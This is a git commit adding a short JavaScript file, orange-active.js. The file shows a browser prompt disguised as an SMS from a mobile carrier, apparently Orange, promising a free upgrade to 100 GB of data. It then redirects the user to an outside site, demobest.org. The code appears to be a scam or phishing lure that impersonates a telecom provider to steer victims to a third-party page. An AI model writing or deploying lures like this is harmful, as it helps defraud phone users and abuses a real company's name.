f2cff3115becd1111887647a7e45b8722acec721
ekpebok <muiznurudeen46@gmail.com>
2025-03-21 07:17:48 +0100

    Create orange-active.js

---
+++ orange-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVER 100 Go'
+password=prompt('SMS: Cher client, veuillez vérifier si votre carte SIM est éligible pour recevoir une offre spéciale sur les anciennes cartes SIM de 10 Go à 100 Go. Appuyez sur OK pour vérifier maintenant.','ACTIVER 100 Go');
+if (password != 'ACTIVER 100 Go') {
+location.href='http://demobest.org/100gb.html';
+}
